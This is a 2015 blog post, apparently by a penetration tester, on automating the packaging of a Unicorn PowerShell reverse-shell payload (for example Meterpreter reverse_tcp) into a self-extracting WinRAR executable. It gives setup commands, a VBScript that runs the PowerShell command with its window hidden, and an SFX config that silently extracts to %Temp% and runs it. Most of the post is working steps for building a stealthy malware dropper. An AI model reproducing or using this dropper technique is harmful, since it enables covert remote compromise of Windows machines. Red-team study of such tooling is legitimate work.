---
layout: post
title: Making a Powershell EXE Payload
category: 
year: 2015
month: 5
day: 13
published: true
summary: A script to make a powershell payload into an executable
---
     
<div class="row">  
     <div class="span9 columns">

<p>I've been using TrustedSec's <a href="https://github.com/trustedsec/unicorn">Unicorn</a> a LOT over the past few months. In fact, it's become my go-to payload to pop a box. While it's awesome to be able to paste a command and get a shell, sometimes an EXE is required.

<p>For those cases, I've made a script to make the whole process automated: <code>powershell_exe.py</code>


<p><h3>tl;dr</h3>
<code>powershell_exe.py</code> uses winrar's commandline options under wine to make a self-extracting archive.
<p><a href="https://github.com/bluscreenofjeff/Scripts/blob/master/powershell_exe.py">Source</a>

<p><b>Setup instructions</b>
{% highlight bash lineanchors %}
cd /opt
git clone https://github.com/trustedsec/unicorn.git

cd ~/Desktop
wget http://www.rarlab.com/rar/wrar511.exe
wine wrar511.exe
{% endhighlight %}
<p>Now just go through the default options of winrar to finish the install.
<br>
<p><b>Usage:</b>
{% highlight bash lineanchors %}
python power_exe.py <payload> <ip address> <port>
Example: python power_exe.py windows/meterpreter/reverse_tcp 192.168.1.5 443
{% endhighlight %}  
<br>
<p><b>Results</b>
<p>The script outputs a <code>powerpay.exe</code> file and leaves Unicorn's <code>powershell_attack.txt</code> file. 
<p>To have the script remove the Unicorn command, uncomment line 39: <code>system("rm powershell_attack.txt")</code>


<p><h3>How it works</h3>
<p>The script runs Unicorn using the provided options for payload, IP, and port. The result is the Powershell command text in <code>powershell_attack.txt</code>.

<p>The code from <code>powershell_attack.txt</code> is inserted into the following vbscript file to call the command without that ugly black command prompt popping up:
{% highlight basic lineanchors %}
Dim shell,command
command = "<POWERSHELLCOMMAND>"
Set shell = CreateObject("WScript.Shell")
shell.Run command,0
{% endhighlight %}
<br>
<p>An <code>xfs.config</code> file is written for winrar:
{% highlight bash lineanchors %}
;The comment below contains SFX script commands

Path=%Temp%
Setup=run.vbs
Silent=1
Overwrite=1
{% endhighlight %}
<p>You can have multiple Setup lines in that file, so if you wanted to have the payload run and then create an error or run an intel script, you could just edit the config file, add the file creation to the script, and edit the wine command below.
<br>

<p>Winrar's command line options are plentiful, but for our purposes the syntax is as follows:<br>
{% highlight bash lineanchors %}
wine /root/.wine/drive_c/Program\ Files/WinRAR/Rar.exe a -r -u -sfx -z'xfs.config' powerpay run.vbs
{% endhighlight %}
What the flags mean:
<ul style="list-style-type: none;">
  <li><b>a</b> : adds to the designated archive (powerpay in this case)</li>
  <li><b>-r</b> : recurses subfolders (if applicable)</li>
  <li><b>-u</b> : updates the archive with new files and adds the new files to the archive</li>
  <li><b>-sfx</b> : makes the archive an SFX (self-extracting) archive</li>
  <li><b>-z</b> : specifies the xfs.config file. Note there is no space between the flag and path to config file</li>
  <li><b>powerpay</b> : name of the archive. This will output as powerpay.exe</li>
  <li><b>run.vbs</b> : the file being added to the archive. You can add multiple files with spaces between the paths</li>
</ul>

<p>That's it! It should probably be said that I am <b>not</b> a programmer, so the source is definitely not written the "right" way. 

     </div>

</div>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'bluscreenofjeff';
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
<div class="row">
     <div class="span9 column">
          <p class="pull-right">{% if page.previous.url %} <a href="{{page.previous.url}}" title="Previous Post: {{page.previous.title}}"><i class="icon-chevron-left"></i></a>     {% endif %}   {% if page.next.url %}    <a href="{{page.next.url}}" title="Next Post: {{page.next.title}}"><i class="icon-chevron-right"></i></a>     {% endif %} </p>  
     </div>
</div>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61938642-1', 'auto');
  ga('send', 'pageview');

</script>